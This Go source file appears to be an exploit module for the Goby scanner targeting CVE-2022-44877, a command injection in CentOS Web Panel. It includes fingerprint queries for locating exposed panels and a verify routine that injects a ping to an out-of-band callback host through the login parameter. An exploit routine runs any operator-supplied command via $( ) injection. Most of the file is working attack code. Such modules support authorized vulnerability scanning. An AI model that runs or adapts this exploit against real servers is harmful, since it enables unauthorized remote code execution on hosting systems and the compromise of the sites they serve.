package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "CentOS Web Panel RCE (CVE-2022-44877)",
    "Description": "<p>CentOS Web Panel (CWP) is a free web hosting control panel from the Control Web Panel community.</p><p>An operating system command injection vulnerability exists in CentOS Web Panel version 0.9.8.1147 due to improper validation of a user-supplied string before executing a system call. An attacker could exploit this vulnerability to execute arbitrary code.</p>",
    "Product": "CWP-Virtual-Host-CP",
    "Homepage": "https://control-webpanel.com/",
    "DisclosureDate": "2023-01-05",
    "Author": "csca",
    "FofaQuery": "body=\"href=\\\"/login/cwp_theme/original/img/ico/favicon.ico\\\"\" || body=\"src=\\\"/login/cwp_theme/original/img/new_logo_small.png\\\"\" || title==\"Login | CentOS WebPanel\" || title=\"HTTP Server Test Page powered by CentOS-WebPanel.com\" || body=\"Login | Control WebPanel\"",
    "GobyQuery": "body=\"href=\\\"/login/cwp_theme/original/img/ico/favicon.ico\\\"\" || body=\"src=\\\"/login/cwp_theme/original/img/new_logo_small.png\\\"\" || title==\"Login | CentOS WebPanel\" || title=\"HTTP Server Test Page powered by CentOS-WebPanel.com\" || body=\"Login | Control WebPanel\"",
    "Level": "3",
    "Impact": "<p>An operating system command injection vulnerability exists in CentOS Web Panel version 0.9.8.1147 due to improper validation of a user-supplied string before executing a system call. An attacker could exploit this vulnerability to execute arbitrary code.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"http://centos-webpanel.com/\">http://centos-webpanel.com/</a></p>",
    "References": [
        "https://github.com/numanturle/CVE-2022-44877"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ping yourip",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2022-44877"
    ],
    "CNNVD": [
        "CNNVD-202301-425"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "CentOS Web Panel 远程命令执行漏洞（CVE-2022-44877）",
            "Product": "CWP-虚拟主机控制面板",
            "Description": "<p>CentOS Web Panel（CWP）是Control Web Panel社区的一款免费的虚拟主机控制面板。<br></p><p>CentOS Web Panel 0.9.8.1147版本中存在操作系统命令注入漏洞，该漏洞源于在执行系统调用之前未正确验证用户提供的字符串。攻击者可利用该漏洞执行任意代码。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"http://centos-webpanel.com/\">http://centos-webpanel.com/</a><br></p>",
            "Impact": "<p>CentOS Web Panel 0.9.8.1147版本中存在操作系统命令注入漏洞，该漏洞源于在执行系统调用之前未正确验证用户提供的字符串。攻击者可利用该漏洞执行任意代码。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "CentOS Web Panel RCE (CVE-2022-44877)",
            "Product": "CWP-Virtual-Host-CP",
            "Description": "<p>CentOS Web Panel (CWP) is a free web hosting control panel from the Control Web Panel community.<br></p><p>An operating system command injection vulnerability exists in CentOS Web Panel version 0.9.8.1147 due to improper validation of a user-supplied string before executing a system call. An attacker could exploit this vulnerability to execute arbitrary code.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"http://centos-webpanel.com/\">http://centos-webpanel.com/</a><br></p>",
            "Impact": "<p>An operating system command injection vulnerability exists in CentOS Web Panel version 0.9.8.1147 due to improper validation of a user-supplied string before executing a system call. An attacker could exploit this vulnerability to execute arbitrary code.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10706"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			//Godserver
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			uri := fmt.Sprintf("/login/index.php?login=$(ping${IFS}-c${IFS}1${IFS}%s)", checkUrl)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Referer",u.FixedHostInfo+"/login/index.php?login=failed")
			cfg.Data = "username=root&password=toor&commit=Login"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {

				return godclient.PullExists(checkStr, time.Second*10)

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			strings.ReplaceAll(cmd," ","${IFS}")
			uri := fmt.Sprintf("/login/index.php?login=$(%s)", cmd)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Referer",expResult.HostInfo.FixedHostInfo+"/login/index.php?login=failed")
			cfg.Data = "username=root&password=toor&commit=Login"
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = "命令已执行"
				expResult.Success = true

			}
			return expResult
		},
	))
}
